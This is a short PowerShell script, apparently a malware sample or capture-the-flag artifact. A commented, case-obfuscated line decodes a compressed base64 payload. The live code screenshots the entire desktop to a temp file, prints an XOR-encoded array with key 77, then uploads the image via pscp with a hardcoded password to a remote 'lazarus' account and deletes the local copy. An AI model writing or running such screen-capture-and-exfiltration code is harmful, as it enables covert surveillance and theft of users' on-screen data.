# ( new-ObJecT  sYstEM.io.STreaMrEAdeR( (nEW-ObJecT iO.CompReSSioN.deFlatesTREam( [sySTEM.Io.MeMORySTReaM][sYStem.CONvert]::fROMbAse64sTrInG('dVLva9swEP1u8P+ghjJSsNXYiZPMMEjXrW1g/cES1g/LPij21dFmWUJSkjrsj+8pSloKm9HZunfv3jsjXZRlPG8VkPjCGBDLur1jAsisNRYEfeRNKbeGXkktTBicmkIDNOQT+fmuQj192jxhxiyXza88/8G1XbN6tm/B3iW3ginsvYNtfL/8DYUlXzTb8qain33toI+2pV1Fr+kN8GplUaLSTK144fyPndceMmh4paWYClZB9+B19tZCL6VqHcGP0z1Kf4Mn+2Y0lyoivf06SNAZ38HZ6/R0xjbQ7ZxCs8nnX28fFqyHT0JLZjt7N8lqnG4wjkjSO776ERn0fAzdfojfNCIZRh8jcRSHDzwnG/m6w5M0wyICGSbZwAk6EANXgobPUv+BFi1HozAIg0fNLcQ30liyn+U94smOB8VKkob8JR9I5zJfHA5z4Y+xny6UKRSFZ+iQWG1JPUkner07OSH//nNSsx3TazNJPqY0GY5pP6PjLD+3Qp2vDWguKor7MPgOQm4gnqLJ/6RivFAFhMEL' ) , [sySteM.Io.cOMPressIon.cOmpRESSiONMODE]::decOmPReSS)), [TeXT.EncOdiNg]::AscII) ).readtoend()

Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save("$env:TEMP\a00001.dat")
$goal = 48, 108, 108, 3, 40, 40, 63, 46, 62, 52, 32, 18, 33, 44, 40, 57, 62, 18, 125, 37, 58, 54, 10, 12, 1, 11
$xorkey = 77

Write-Host $goal
Write-Host $xorkey

echo n | & "C:\Windows\System32\pscp.exe" -pw l@2@ruz!! "$env:TEMP\a00001.dat" lazarus@192.168.35.85:/tmp/userimg.tmp
Remove-Item "$env:TEMP\a00001.dat" -Force